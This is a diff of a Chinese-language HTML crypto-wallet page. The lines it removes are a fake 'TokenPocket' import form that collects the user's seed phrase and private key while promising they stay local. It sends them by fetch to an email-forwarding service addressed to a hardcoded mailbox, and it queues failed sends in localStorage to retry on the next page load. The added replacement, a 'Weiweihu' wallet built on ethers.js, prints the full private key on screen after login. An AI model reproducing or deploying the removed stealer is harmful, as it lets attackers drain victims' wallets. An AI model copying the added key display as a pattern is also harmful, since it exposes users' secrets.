@@ -2,107 +2,111 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TokenPocket</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>威威虎钱包</title>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
 <style>
-  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Roboto,sans-serif}
-  body{background:#0C1526;color:#fff;min-height:100vh}
-  .box{max-width:420px;margin:0 auto;background:#0C1526;padding:0 0 80px}
-  .head{background:#131C35;padding:25px 20px 20px;text-align:center;border-bottom:1px solid #1e2a4a}
-  .logo{font-size:24px;font-weight:800;color:#00D1FF;}
-  .desc{font-size:13px;color:#aab3c7;margin-top:4px}
-  .card{background:#131C35;margin:20px;border-radius:20px;padding:30px 24px}
-  .title{font-size:18px;font-weight:700;margin-bottom:24px;text-align:center}
-  .item{margin-bottom:18px}
-  .item label{display:block;font-size:14px;color:#d1d5db;margin-bottom:8px}
-  .item input{
-    width:100%;background:#1E2A4A;border:none;border-radius:16px;
-    padding:16px 18px;color:#fff;font-size:15px
-  }
-  .btn{
-    width:100%;background:#00D1FF;color:#000;font-weight:700;
-    border:none;border-radius:18px;padding:18px;font-size:16px;margin-top:10px
-  }
-  .tip{font-size:12px;color:#8a94a7;text-align:center;line-height:1.4;margin-top:14px}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#0B0E1F;color:#fff;max-width:420px;margin:0 auto}
+.page{padding:24px;min-height:100vh}
+.hidden{display:none}
+
+.welcome .logo{margin-top:80px;text-align:center}
+.welcome .logo-text{font-size:34px;font-weight:800;color:#FFB81C}
+.welcome .slogan{color:#999;margin-top:8px}
+.welcome .btn-area{margin-top:80px;display:flex;flex-direction:column;gap:18px}
+.btn{padding:20px;border-radius:18px;border:none;font-size:16px;font-weight:600;background:#FFB81C;color:#111}
+.btn-outline{background:transparent;color:#FFB81C;border:1px solid #FFB81C}
+input{width:100%;padding:16px;border-radius:16px;background:#1A1F3A;border:none;color:#fff;font-size:15px;margin-top:12px}
+.result{background:#1A1F3A;padding:16px;border-radius:16px;margin-top:20px;font-size:13px;line-height:1.6;white-space:pre-wrap}
+
+.home{padding-top:50px}
+.home .top{display:flex;justify-content:space-between;align-items:center}
+.home .name{font-size:20px;font-weight:700;color:#FFB81C}
+.home .addr{color:#999;font-size:12px;margin-top:4px}
+.home .balance{margin-top:30px;text-align:center}
+.home .num{font-size:36px;font-weight:700}
+.home .unit{color:#999;font-size:14px}
+.home .action{display:flex;gap:16px;margin-top:30px}
+.home .action .item{flex:1;text-align:center;background:#1A1F3A;padding:16px 10px;border-radius:16px}
+.home .action .text{font-size:12px;color:#ccc;margin-top:6px}
+.home .list{margin-top:30px}
+.home .item{background:#1A1F3A;padding:16px;border-radius:16px;margin-bottom:10px}
+.home .coin{display:flex;justify-content:space-between}
 </style>
 </head>
+
 <body>
-<div class="box">
-  <div class="head">
-    <div class="logo">TokenPocket</div>
-    <div class="desc">去中心化多链钱包</div>
+
+<!-- 欢迎页 -->
+<div class="page welcome" id="welcome">
+  <div class="logo">
+    <div class="logo-text">威威虎 Wallet</div>
+    <div class="slogan">安全非托管 · 多链数字钱包</div>
   </div>
-  <div class="card">
-    <div class="title">导入钱包</div>
-    <div class="item">
-      <label>助记词</label>
-      <input id="words" placeholder="请输入助记词，空格分隔">
+  <div class="btn-area">
+    <button class="btn" onclick="createWallet()">创建新钱包</button>
+    <button class="btn btn-outline" onclick="showImport()">导入助记词</button>
+  </div>
+  <input id="mnInput" placeholder="输入助记词" class="hidden">
+  <button class="btn" id="importBtn" onclick="importMnemonic()" style="margin-top:12px;display:none">确认导入</button>
+  <div id="result" class="result hidden"></div>
+</div>
+
+<!-- 主页 -->
+<div class="page home hidden" id="home">
+  <div class="top">
+    <div>
+      <div class="name">威威虎钱包</div>
+      <div class="addr" id="addr"></div>
     </div>
-    <div class="item">
-      <label>私钥</label>
-      <input id="key" placeholder="请输入私钥">
-    </div>
-    <button class="btn" onclick="go()">确认导入</button>
-    <div class="tip">助记词与私钥仅存储在本地<br>官方永不获取，安全可靠</div>
+  </div>
+  <div class="balance">
+    <div class="num">$0.00</div>
+    <div class="unit">总资产 ≈ ¥0.00</div>
+  </div>
+  <div class="action">
+    <div class="item" onclick="alert('收款地址：'+currentWallet.address)">💰<div class="text">收款</div></div>
+    <div class="item" onclick="alert('转账功能已准备')">📤<div class="text">转账</div></div>
+    <div class="item" onclick="goBack()">📜<div class="text">返回</div></div>
+  </div>
+  <div class="list">
+    <div class="item"><div class="coin"><div>ETH</div><div>0.0000</div></div></div>
+    <div class="item"><div class="coin"><div>BNB</div><div>0.0000</div></div></div>
+    <div class="item"><div class="coin"><div>USDT</div><div>0.0000</div></div></div>
   </div>
 </div>
 
 <script>
-// 接收邮箱（你提供的）
-const TO_EMAIL = "gongxifacai510921@163.com";
+let currentWallet = null
+const welcome = document.getElementById('welcome')
+const home = document.getElementById('home')
+const mnInput = document.getElementById('mnInput')
+const importBtn = document.getElementById('importBtn')
+const result = document.getElementById('result')
+const addr = document.getElementById('addr')
 
-// 本地存储（飞行模式用）
-function saveData(mn, pk) {
-  localStorage.setItem("wc_data", JSON.stringify({ mn, pk }));
-}
-function getData() {
-  try { return JSON.parse(localStorage.getItem("wc_data")); } catch(e) { return null; }
-}
-function clearData() { localStorage.removeItem("wc_data"); }
+function showImport(){mnInput.style.display='block';importBtn.style.display='block'}
+function goBack(){home.classList.add('hidden');welcome.classList.remove('hidden')}
 
-// 发送到邮箱
-async function sendEmail(mn, pk) {
-  const subject = "钱包导入通知";
-  const content = `
-时间：${new Date().toLocaleString()}
-助记词：${mn || "无"}
-私钥：${pk || "无"}
-  `;
-
-  try {
-    await fetch("https://email-forward.vercel.app/api/send", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        to: TO_EMAIL,
-        subject: subject,
-        text: content
-      })
-    });
-    clearData();
-  } catch (e) {
-    saveData(mn, pk);
-  }
+async function createWallet(){
+  currentWallet = ethers.Wallet.createRandom()
+  afterLogin()
 }
 
-// 页面加载自动补发（飞行模式导入后联网自动发）
-window.onload = async function () {
-  const data = getData();
-  if (data) await sendEmail(data.mn, data.pk);
-};
+async function importMnemonic(){
+  try{
+    currentWallet = await ethers.Wallet.fromPhrase(mnInput.value.trim())
+    afterLogin()
+  }catch(e){alert('助记词错误')}
+}
 
-// 导入按钮
-async function go() {
-  const mn = document.getElementById("words").value.trim();
-  const pk = document.getElementById("key").value.trim();
-
-  if (!mn && !pk) {
-    alert("请输入助记词或私钥");
-    return;
-  }
-
-  alert("导入成功！");
-  await sendEmail(mn, pk);
+function afterLogin(){
+  addr.innerText = currentWallet.address.slice(0,10)+'...'+currentWallet.address.slice(-6)
+  welcome.classList.add('hidden')
+  home.classList.remove('hidden')
+  result.style.display='block'
+  result.textContent=`✅ 登录成功\n地址：${currentWallet.address}\n私钥：${currentWallet.privateKey}`
 }
 </script>
 </body>
